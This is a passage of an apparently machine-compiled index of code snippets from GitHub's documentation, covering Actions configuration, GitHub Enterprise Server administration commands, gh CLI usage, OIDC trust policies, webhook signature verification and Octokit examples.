failure. It is extracted from the `unicorn.log` file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-email-for-notifications.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nThis is a test email generated from https://10.0.0.68/setup/settings\nConnection opened: smtp.yourdomain.com:587\n-> \"220 smtp.yourdomain.com ESMTP nt3sm2942435pbc.14\\r\\n\"\n<- \"EHLO yourdomain.com\\r\\n\"\n-> \"250-smtp.yourdomain.com at your service, [1.2.3.4]\\r\\n\"\n-> \"250-SIZE 35882577\\r\\n\"\n-> \"250-8BITMIME\\r\\n\"\n-> \"250-STARTTLS\\r\\n\"\n-> \"250-ENHANCEDSTATUSCODES\\r\\n\"\n-> \"250 PIPELINING\\r\\n\"\n<- \"STARTTLS\\r\\n\"\n-> \"220 2.0.0 Ready to start TLS\\r\\n\"\nTLS connection started\n<- \"EHLO yourdomain.com\\r\\n\"\n-> \"250-smtp.yourdomain.com at your service, [1.2.3.4]\\r\\n\"\n-> \"250-SIZE 35882577\\r\\n\"\n-> \"250-8BITMIME\\r\\n\"\n-> \"250-AUTH LOGIN PLAIN XOAUTH\\r\\n\"\n-> \"250-ENHANCEDSTATUSCODES\\r\\n\"\n-> \"250 PIPELINING\\r\\n\"\n<- \"AUTH LOGIN\\r\\n\"\n-> \"334 VXNlcm5hbWU6\\r\\n\"\n<- \"dGhpc2lzbXlAYWRkcmVzcy5jb20=\\r\\n\"\n-> \"334 UGFzc3dvcmQ6\\r\\n\"\n<- \"aXRyZWFsbHl3YXM=\\r\\n\"\n-> \"535-5.7.1 Username and Password not accepted. Learn more at\\r\\n\"\n-> \"535 5.7.1 http://support.yourdomain.com/smtp/auth-not-accepted nt3sm2942435pbc.14\\r\\n\"\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_PROJECT_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_PROJECT_ID` to the GitHub Actions equivalent `${{ github.repository }}`. Repository info.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_61\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Setting PAT environment variables in Terminal\nDESCRIPTION: Sets the GH_PAT and GH_SOURCE_PAT environment variables using the `export` command in a Terminal environment. The variables are used to store Personal Access Tokens for the destination and source organizations respectively. Replace TOKEN with the actual PAT values.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/env-variables-gei.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nexport GH_PAT=\"TOKEN\"\nexport GH_SOURCE_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Configuring IAM role trust policy with environment sub claim (JSON)\nDESCRIPTION: This JSON snippet demonstrates how to configure the trust policy for an IAM role in AWS using the `sub` claim in the OIDC token. The `sub` claim is used to restrict which GitHub Actions workflows are able to assume the role, based on repository and environment. It is designed to be used with GitHub Actions environments, so replace octo-org/octo-repo and prod with the correct values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"Condition\": {\n  \"StringEquals\": {\n    \"{`HOSTNAME/_services/token`}:aud\": \"sts.amazonaws.com\",\n    \"{`HOSTNAME/_services/token`}:sub\": \"repo:octo-org/octo-repo:environment:prod\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a JSON Schema for Copilot Skillset Parameters\nDESCRIPTION: This JSON schema defines the structure of the data expected by an API endpoint for a Copilot skillset. It specifies that the endpoint expects a JSON object with two optional string properties: `status` and `label`.  The `status` property has an enum limiting valid values to \"open\" or \"closed\". If no parameters are provided, an empty object with type 'object' must be passed in the request body.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-skillset-for-your-copilot-extension/building-copilot-skillsets.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n \"type\": \"object\",\n \"properties\": {\n   \"status\": {\n     \"type\": \"string\",\n     \"description\": \"filter issues by status (open, closed)\",\n     \"enum\": [\"open\", \"closed\"]\n   },\n   \"label\": {\n     \"type\": \"string\",\n     \"description\": \"filter issues by label\"\n   }\n }\n}\n```\n\n----------------------------------------\n\nTITLE: Draining Jobs Queue by Setting Runners to Zero\nDESCRIPTION: This snippet configures ARC to drain the jobs queue by setting both `maxRunners` and `minRunners` to `0` in the `values.yaml` file. This prevents ARC from creating new runner pods when new jobs are assigned. This is useful for troubleshooting or maintenance.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0\n```\n\n----------------------------------------\n\nTITLE: Applying Cluster Configuration\nDESCRIPTION: This snippet shows how to apply the cluster configuration after modifying the `/data/user/common/authorized_keys` file. This command validates and copies the configuration to each node in the cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nadmin@ghe-data-node-0:~$ ghe-cluster-config-apply\n> Validating configuration\n> ...\n> Finished cluster configuration\n```\n\n----------------------------------------\n\nTITLE: Example Update Output\nDESCRIPTION: This shell script output shows an example of a successful update of the GitHub Actions Importer CLI. It confirms that the image is up-to-date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Individual Mannequin Reclamation with ado2gh extension (GitHub CLI)\nDESCRIPTION: This command reclaims an individual mannequin and attributes their contributions to a specified user when the migration source is Azure DevOps. Replace DESTINATION with the target GitHub organization, MANNEQUIN with the mannequin's username, and USERNAME with the target user's username.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh reclaim-mannequin --github-org DESTINATION --mannequin-user MANNEQUIN --target-user USERNAME\n```\n\n----------------------------------------\n\nTITLE: Download a specific workflow artifact using gh CLI\nDESCRIPTION: Downloads a specific artifact from a workflow run using the `gh run download` subcommand with the `-n` flag. `RUN_ID` is replaced with the ID of the run, and `ARTIFACT_NAME` is replaced with the name of the artifact. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh run download RUN_ID -n ARTIFACT_NAME\n```\n\n----------------------------------------\n\nTITLE: Clone forked repository using Git\nDESCRIPTION: This command clones a forked repository to a local machine. It requires Git to be installed. Replace `YOUR-USERNAME` with the actual GitHub username.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/YOUR-USERNAME/Spoon-Knife\n```\n\n----------------------------------------\n\nTITLE: Initialize Octokit and enable auto pagination\nDESCRIPTION: This snippet initializes the Octokit Ruby library and enables automatic pagination for API requests. This ensures that all results are retrieved, even if they span multiple pages. It requires the 'octokit' gem.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/discovering-resources-for-a-user.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\nOctokit.auto_paginate = true\n```\n\n----------------------------------------\n\nTITLE: Executing JIT Runner Configuration\nDESCRIPTION: This code snippet demonstrates how to execute a self-hosted runner with a just-in-time (JIT) configuration. The `run.sh` script is called with the `--jitconfig` parameter, passing the encoded JIT configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n./run.sh --jitconfig ${encoded_jit_config}\n```\n\n----------------------------------------\n\nTITLE: Checking if a codespace was created from a prebuild using cat and jq\nDESCRIPTION: This command checks if a codespace was created from a prebuild by reading the `environment-variables.json` file and using `jq` to extract the `ACTION_NAME` property. If the codespace was created from a prebuild, it returns `createFromPrebuild`. It requires `jq` to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-prebuilds.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncat /workspaces/.codespaces/shared/environment-variables.json | jq '.ACTION_NAME'\n```\n\n----------------------------------------\n\nTITLE: Packaging a .NET Project\nDESCRIPTION: This command packages a .NET project into a NuGet package (.nupkg file). The `dotnet pack` command creates the package, and the `--configuration Release` option specifies that the project should be built in Release configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ndotnet pack --configuration Release\n```\n\n----------------------------------------\n\nTITLE: Configure Azure Blob Storage Connection (ghe-config)\nDESCRIPTION: This command configures the connection string for Azure Blob Storage to be used by GitHub Actions. Replace 'CONNECTION STRING' with the actual connection string for your Azure Blob Storage account. This enables GitHub Actions to store and retrieve artifacts from Azure Blob Storage.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.azure.connection-string \"CONNECTION STRING\"\n```\n\n----------------------------------------\n\nTITLE: Purging Image Cache using Curl\nDESCRIPTION: This code snippet demonstrates how to purge an image from Camo's cache using the `curl` command with the `-X PURGE` option. This forces all users to re-request the image, so it should be used sparingly.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/about-anonymized-urls.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -X PURGE https://camo.githubusercontent.com/4d04abe0044d94fefcf9af2133223....\n> {\"status\": \"ok\", \"id\": \"216-8675309-1008701\"}\n```\n\n----------------------------------------\n\nTITLE: Search Issues with Text Match Metadata Using curl\nDESCRIPTION: This shell command demonstrates how to search issues and pull requests using the GitHub REST API, including the `Accept` header for text match metadata. It constructs a `curl` request with the appropriate headers and query parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/search/search.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H 'Accept: application/vnd.github.text-match+json' \\\n'{% data variables.product.rest_url %}/search/issues?q=windows+label:bug \\\n+language:python+state:open&sort=created&order=asc'\n```\n\n----------------------------------------\n\nTITLE: Creating issue with title and project via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue with a pre-defined title and assign it to a project using query parameters. The `title` parameter sets the issue's title to \"Bug fix,\" and the `projects` parameter adds it to the organization's project 1.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_7\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?title=Bug+fix&projects=octo-org/1\n```\n\n----------------------------------------\n\nTITLE: Test SSH Connection to GitHub\nDESCRIPTION: Shows how to test SSH access to GitHub using `ssh -T`. This command attempts to establish an SSH connection and verifies if the SSH key is properly configured and associated with the GitHub account. A successful connection displays a greeting with the username.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ ssh -T git@{% data variables.product.product_url %}\n> Hi USERNAME! You've successfully authenticated, but GitHub does not\n> provide shell access.\n```\n\n----------------------------------------\n\nTITLE: Code Syntax Highlighting Example\nDESCRIPTION: Illustrates how to implement syntax highlighting in code samples within GitHub Docs using triple backticks followed by the language identifier. In this particular example, it shows how to highlight a `git init` command with bash syntax highlighting.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit init YOUR-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Enabling Prometheus metrics exporter via API - Shell\nDESCRIPTION: This snippet shows how to enable the Prometheus metrics exporter using the API by sending a `PUT` request to the configuration settings endpoint. It uses `curl` to send a JSON payload with the `prometheus.enabled` flag set to `true` and specifies trusted IP addresses for scraping. The API key needs to be provided for authentication. The hostname needs to be updated accordingly.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/exporting-and-scraping-prometheus-metrics.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -L -H \"Content-Type: application/json\" -X PUT -u \"api_key:xxxxxxx\" https://<hostname>/manage/v1/config/settings -d '{\"prometheus\": {\"enabled\": true, \"trusted_ips\": \"10.0.0.1, 192.168.1.0/8\"}}'\n```\n\n----------------------------------------\n\nTITLE: Formatting Disk with Legacy Partition Table\nDESCRIPTION: This series of `parted` commands formats the new disk with a legacy (msdos) partition table and creates two primary partitions. Replace `/dev/xvdg` with the actual device name.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nsudo parted /dev/xvdg mklabel msdos\nsudo parted /dev/xvdg mkpart primary ext4 0% 50%\nsudo parted /dev/xvdg mkpart primary ext4 50% 100%\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub CLI with Homebrew\nDESCRIPTION: This snippet demonstrates how to install the GitHub CLI (gh) using the Homebrew package manager on macOS. It uses the `brew install` command followed by the package name `gh`. The user will be prompted to follow on-screen instructions after running the command.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nbrew install gh\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration Changes via ghe-config-apply\nDESCRIPTION: This snippet demonstrates how to apply the configuration changes made using `ghe-config`. It executes the `ghe-config-apply` command, which triggers a configuration run to apply the new settings.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-rate-limits.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: README Markdown Example\nDESCRIPTION: This is a basic README.md example demonstrating how to use the JavaScript action. It outlines the action's purpose, required inputs (`who-to-greet`), and outputs (`time`), along with a usage example in a workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n# Hello world javascript action\n\nThis action prints \"Hello World\" or \"Hello\" + the name of a person to greet to the log.\n\n## Inputs\n\n### `who-to-greet`\n\n**Required** The name of the person to greet. Default `\"World\"`.\n\n## Outputs\n\n### `time`\n\nThe time we greeted you.\n\n## Example usage\n\n```yaml\nuses: actions/hello-world-javascript-action@e76147da8e5c81eaf017dede5645551d4b94427b\nwith:\n  who-to-greet: 'Mona the Octocat'\n```\n```\n\n----------------------------------------\n\nTITLE: Configuring a Dockerfile in devcontainer.json\nDESCRIPTION: This snippet demonstrates how to specify a Dockerfile to use for building the dev container within the `devcontainer.json` file. The `build` property with the `dockerfile` key is used to point to the location of the Dockerfile.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/introduction-to-dev-containers.md#_snippet_1\n\nLANGUAGE: jsonc\nCODE:\n```\n{\n  // ...\n  \"build\": { \"dockerfile\": \"Dockerfile\" },\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Repository Owner\nDESCRIPTION: This JSON template customizes the `sub` claim to include only the `repository_owner`. It allows granting access based on the owner of the repository.  The corresponding cloud provider OIDC configuration should be updated to require a specific value for this claim.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Escaping Parentheses in Markdown Task Lists\nDESCRIPTION: Demonstrates how to escape a parenthesis at the beginning of a task list item's description using a backslash. This is necessary to prevent Markdown from misinterpreting the parenthesis.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_12\n\nLANGUAGE: markdown\nCODE:\n```\n- [ ] \\(Optional) Open a followup issue\n```\n\n----------------------------------------\n\nTITLE: Executing Network Setup Command in GHES Shell\nDESCRIPTION: This snippet demonstrates how to use the `ghe-setup-network` command in visual mode to edit the nameservers for GitHub Enterprise Server via the administrative shell. This command allows for interactive configuration of network settings.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-dns-nameservers.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-setup-network -v\n```\n\n----------------------------------------\n\nTITLE: CodeQL Init with Autobuild (YAML)\nDESCRIPTION: This snippet shows how to configure the CodeQL `init` action with the `build-mode` option set to `autobuild`. It uses a matrix strategy to analyze C/C++ and Go code with automatic build detection.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n# Initializes the CodeQL tools for scanning.\nname: Analyze\nstrategy:\n  matrix:\n    include:\n      # Analyze C and C++ code\n      - language: c-cpp\n        build-mode: autobuild\n      # Analyze Go code\n      - language: go\n        build-mode: autobuild\n\nsteps:\n  - uses: {% data reusables.actions.action-codeql-action-init %}\n    with:\n      languages: {% raw %}${{ matrix.language }}{% endraw %}\n      build-mode: {% raw %}${{ matrix.build-mode }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Getting GitHub Issues with gh CLI\nDESCRIPTION: This code snippet demonstrates how to retrieve a list of issues from a GitHub repository using the `gh` CLI. It includes setting the `Accept` header and specifying the repository. The `--include` flag displays the response headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\ngh api \\\n--header 'Accept: application/vnd.github+json' \\\n--method GET /repos/{% ifversion ghes %}REPO-OWNER/REPO-NAME{% else %}octocat/Spoon-Knife{% endif %}/issues \\\n-F per_page=2 --include\n```\n\n----------------------------------------\n\nTITLE: Creating a README file\nDESCRIPTION: Example README file that contains information about the action, inputs and outputs, and usage examples.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_4\n\nLANGUAGE: Markdown\nCODE:\n```\n# Hello world docker action\n\nThis action prints \"Hello World\" or \"Hello\" + the name of a person to greet to the log.\n\n## Inputs\n\n## `who-to-greet`\n\n**Required** The name of the person to greet. Default `\"World\"`.\n\n## Outputs\n\n## `time`\n\nThe time we greeted you.\n\n## Example usage\n\nuses: actions/hello-world-docker-action@v2\nwith:\n  who-to-greet: 'Mona the Octocat'\n```\n\n----------------------------------------\n\nTITLE: Installing Let's Encrypt Certificate with ghe-ssl-acme (Shell)\nDESCRIPTION: The `ghe-ssl-acme` utility installs a Let's Encrypt certificate on the GitHub Enterprise Server appliance. The `-e` flag is used to initiate the process. The `-x` flag removes the ACME configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_25\n\nLANGUAGE: shell\nCODE:\n```\nghe-ssl-acme -e\n```\n\n----------------------------------------\n\nTITLE: Object Filters Example - JSON Array\nDESCRIPTION: This JSON snippet provides an example of a JSON array of objects, each containing name and quantity. It exemplifies data that could be filtered using `fruits.*.name` to return only the names.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n[\n  { \"name\": \"apple\", \"quantity\": 1 },\n  { \"name\": \"orange\", \"quantity\": 2 },\n  { \"name\": \"pear\", \"quantity\": 1 }\n]\n```\n\n----------------------------------------\n\nTITLE: Sample HTTP POST Request\nDESCRIPTION: This HTTP POST request demonstrates the format and required headers for sending data to a verification endpoint.  It includes example values for the `Github-Public-Key-Identifier` and `Github-Public-Key-Signature` headers, as well as a sample JSON payload. This example illustrates the structure expected by the server.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nPOST / HTTP/2\nHost: HOST\nAccept: */*\nContent-Length: 104\nContent-Type: application/json\nGithub-Public-Key-Identifier: bcb53661c06b4728e59d897fb6165d5c9cda0fd9cdf9d09ead458168deb7518c\nGithub-Public-Key-Signature: MEQCIQDaMKqrGnE27S0kgMrEK0eYBmyG0LeZismAEz/BgZyt7AIfXt9fErtRS4XaeSt/AO1RtBY66YcAdjxji410VQV4xg==\n\n[{\"source\":\"commit\",\"token\":\"some_token\",\"type\":\"some_type\",\"url\":\"https://example.com/base-repo-url/\"}]\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature with JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to verify a webhook signature using the Web Crypto API. It defines an `verifySignature` function that takes the secret, header, and payload as input. It extracts the signature from the header, imports the secret as an HMAC key, and then uses the key to verify the signature against the payload. The `hexToBytes` function converts the hexadecimal signature to a byte array.  The function uses asynchronous operations (`async/await`) for cryptographic operations.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/validating-webhook-deliveries.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nlet encoder = new TextEncoder();\n\nasync function verifySignature(secret, header, payload) {\n    let parts = header.split(\"=\");\n    let sigHex = parts[1];\n\n    let algorithm = { name: \"HMAC\", hash: { name: 'SHA-256' } };\n\n    let keyBytes = encoder.encode(secret);\n    let extractable = false;\n    let key = await crypto.subtle.importKey(\n        \"raw\",\n        keyBytes,\n        algorithm,\n        extractable,\n        [ \"sign\", \"verify\" ],\n    );\n\n    let sigBytes = hexToBytes(sigHex);\n    let dataBytes = encoder.encode(payload);\n    let equal = await crypto.subtle.verify(\n        algorithm.name,\n        key,\n        sigBytes,\n        dataBytes,\n    );\n\n    return equal;\n}\n\nfunction hexToBytes(hex) {\n    let len = hex.length / 2;\n    let bytes = new Uint8Array(len);\n\n    let index = 0;\n    for (let i = 0; i < hex.length; i += 2) {\n        let c = hex.slice(i, i + 2);\n        let b = parseInt(c, 16);\n        bytes[index] = b;\n        index += 1;\n    }\n\n    return bytes;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring publishConfig in package.json (Shell)\nDESCRIPTION: This snippet demonstrates how to configure the `publishConfig` section in the `package.json` file to specify the registry for publishing npm packages to GitHub Packages.  It uses conditional logic based on the GitHub version (FPT/GHEC or others) to determine the correct registry URL. The resulting configuration will specify where the package will be published.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n\"publishConfig\": {\n  \"registry\": \"https://{% ifversion fpt or ghec %}npm.pkg.github.com{% else %}npm. HOSTNAME/{% endif %}\"\n},\n```\n\n----------------------------------------\n\nTITLE: Defining Ubuntu Runner Labels - GitHub Actions\nDESCRIPTION: These code snippets represent workflow labels used to specify the Ubuntu runner environment in GitHub Actions. The labels allow users to select specific Ubuntu versions for their jobs, such as 'ubuntu-latest', 'ubuntu-24.04', 'ubuntu-22.04', and 'ubuntu-20.04'. These labels are used in the workflow configuration file to determine the virtual machine environment for running the job.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/supported-github-runners.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-latest\n```\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-24.04\n```\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-22.04\n```\n\nLANGUAGE: YAML\nCODE:\n```\nubuntu-20.04\n```\n\n----------------------------------------\n\nTITLE: Listing Installed GitHub CLI Extensions\nDESCRIPTION: This snippet demonstrates how to list all installed GitHub CLI extensions using the `gh extension list` subcommand. The output includes information on available updates.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh extension list\n```\n\n----------------------------------------\n\nTITLE: Searching audit log excluding hook events\nDESCRIPTION: Example search queries demonstrating how to exclude events related to webhooks. The first query excludes all events in the `hook` category, and the second excludes events where webhook events have been altered.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/searching-the-audit-log-for-your-enterprise.md#_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\n-action:hook\n```\n\nLANGUAGE: Text\nCODE:\n```\n-action:hook.events_changed\n```\n\n----------------------------------------\n\nTITLE: Listing environment secrets via GitHub CLI\nDESCRIPTION: This snippet shows how to list all secrets for a given environment using GitHub CLI. The `--env` flag specifies the environment to list secrets from. Requires GitHub CLI and authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh secret list --env ENV_NAME\n```\n\n----------------------------------------\n\nTITLE: Checking Bundler Version\nDESCRIPTION: This command retrieves the currently installed version of Bundler.  Bundler version 1.6.4 or higher is a prerequisite for using the GitHub Packages registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ bundle --version\nBundler version 1.13.7\n```\n\n----------------------------------------\n\nTITLE: Example organization/repository list\nDESCRIPTION: This snippet shows an example of the list of organizations and repositories that should be entered into the 'Organizations and Repositories' text box when calculating additional committers. Each line represents an organization or repository.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/managing-billing-for-your-products/managing-billing-for-github-advanced-security/viewing-committer-information-for-github-advanced-security.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nexample-org\nocto-org/octo-repo\n```\n\n----------------------------------------\n\nTITLE: Fetching Commit Comments with Octokit.rb\nDESCRIPTION: This snippet demonstrates fetching comments associated with a specific commit using Octokit.rb. It uses the `commit_comments` method and requires the repository name and the SHA1 hash of the commit. The code iterates through the retrieved comments, extracting the username, post date, and comment body. Octokit.rb dependency is necessary, along with a personal access token (PAT) set in the `MY_PERSONAL_TOKEN` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/working-with-comments.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\n# !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n# Instead, set and test environment variables, like below\nclient = Octokit::Client.new :access_token => ENV['MY_PERSONAL_TOKEN']\n\nclient.commit_comments(\"octocat/Spoon-Knife\", \"cbc28e7c8caee26febc8c013b0adfb97a4edd96e\").each do |comment|\n  username = comment[:user][:login]\n  post_date = comment[:created_at]\n  content = comment[:body]\n\n  puts \"#{username} made a comment on #{post_date}. It says:\\n'#{content}'\\n\"\nend\n```\n\n----------------------------------------\n\nTITLE: Rewriting PHP functions in Python\nDESCRIPTION: This Python code defines several functions to retrieve configuration values. These functions are designed to replace the original PHP functions. It relies on the Flask framework for accessing the request object and uses the `get_config` function from the `config.py` file to retrieve configuration settings.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nimport os\n   from flask import request\n   from .config import get_config\n\n   def site_name():\n      return get_config('name')\n\n   def site_url():\n      return get_config('site_url')\n\n   def site_version():\n```\n\n----------------------------------------\n\nTITLE: Comment on Pull Request if Data Files Changed (Octokit.js)\nDESCRIPTION: This function checks if any files changed in a pull request include '/data/' in their path. If so, it posts a comment on the pull request using Octokit.js, informing the user that data files should not be modified manually.  It depends on the `getChangedFiles` function.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\nasync function commentIfDataFilesChanged({owner, repo, pullNumber}) {\n  const changedFiles = await getChangedFiles({owner, repo, pullNumber});\n\n  const filePathRegex = new RegExp(//data//, \"i\");\n  if (!changedFiles.some(fileName => filePathRegex.test(fileName))) {\n    return;\n  }\n\n  try {\n    const {data: comment} = await octokit.request(\"POST 